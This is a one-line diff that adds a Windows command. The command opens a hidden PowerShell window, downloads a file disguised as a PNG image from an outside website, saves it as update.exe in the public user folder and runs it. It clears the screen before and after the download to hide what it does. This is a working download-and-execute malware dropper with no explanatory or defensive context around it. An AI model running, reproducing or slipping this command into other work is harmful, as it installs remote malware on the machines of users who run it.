@@ -1,0 +1,1 @@
+ipconfig c:\ & cls & start cmd.exe /c powershell.exe -windowstyle hidden -c (new-object System.Net.WebClient).Downloadfile('https://www.flagstafftownhomes.com/d/sherazokamase.png','C://Users/Public//update.exe');start C:\Users\Public\update.exe & c:\ & cls
